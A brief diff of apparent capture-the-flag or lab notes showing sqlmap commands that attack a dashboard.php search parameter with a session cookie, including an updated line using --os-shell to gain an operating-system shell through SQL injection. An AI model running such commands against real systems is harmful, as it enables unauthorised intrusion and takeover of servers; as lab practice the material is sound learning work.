@@ -2,4 +2,4 @@
 sqlmap -u 'http://10.129.70.193/dashboard.php?search=anything' --cookie="858ggvh5mjtb181j0grcb6nd3q"
 
 # perform an sql command injection on the above setup
-sqlmap -u 'http://10.129.70.193/dashboard.php?search=anything' --cookie="858ggvh5mjtb181j0grcb6nd3q" --os-shell
+sqlmap -u 'http://10.129.45.252/dashboard.php?search=hello' --cookie="PHPSESSID=sk03u89dk558v7glib9enbl8l1" --os-shell
